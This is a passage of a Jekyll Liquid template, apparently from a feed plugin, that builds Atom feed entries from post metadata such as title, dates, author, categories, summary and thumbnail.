post.lang %}{{\" \"}}xml:lang=\"{{ post.lang }}\"{% endif %}>{% assign post_title = post.title | smartify | strip_html | normalize_whitespace | xml_escape %}<title type=\"html\">{{ post_title }}</title><link href=\"{{ post.url | absolute_url }}\" rel=\"alternate\" type=\"text/html\" title=\"{{ post_title }}\" /><published>{{ post.date | date_to_xmlschema }}</published><updated>{{ post.last_modified_at | default: post.date | date_to_xmlschema }}</updated><id>{{ post.id | absolute_url | xml_escape }}</id>{% assign excerpt_only = post.feed.excerpt_only | default: site.feed.excerpt_only %}{% unless excerpt_only %}<content type=\"html\" xml:base=\"{{ post.url | absolute_url | xml_escape }}\"><![CDATA[{{ post.content | strip }}]]></content>{% endunless %}{% assign post_author = post.author | default: post.authors[0] | default: site.author %}{% assign post_author = site.data.authors[post_author] | default: post_author %}{% assign post_author_email = post_author.email | default: nil %}{% assign post_author_uri = post_author.uri | default: nil %}{% assign post_author_name = post_author.name | default: post_author %}<author><name>{{ post_author_name | default: \"\" | xml_escape }}</name>{% if post_author_email %}<email>{{ post_author_email | xml_escape }}</email>{% endif %}{% if post_author_uri %}<uri>{{ post_author_uri | xml_escape }}</uri>{% endif %}</author>{% if post.category %}<category term=\"{{ post.category | xml_escape }}\" />{% elsif post.categories %}{% for category in post.categories %}<category term=\"{{ category | xml_escape }}\" />{% endfor %}{% endif %}{% for tag in post.tags %}<category term=\"{{ tag | xml_escape }}\" />{% endfor %}{% assign post_summary = post.description | default: post.excerpt %}{% if post_summary and post_summary != empty %}<summary type=\"html\"><![CDATA[{{ post_summary | strip_html | normalize_whitespace }}]]></summary>{% endif %}{% assign post_image = post.image.path | default: post.image %}{% if post_image %}{% unless post_image contains \"://\" %}{% assign post_image = post_image | absolute_url %}{% endunless %}<media:thumbnail xmlns:media=\"http://search.yahoo.com/mrss/\" url=\"{{ post_image | xml_escape }}\" /><media:content medium=\"image\" url=\"{{ post_image | xml_escape }}\"
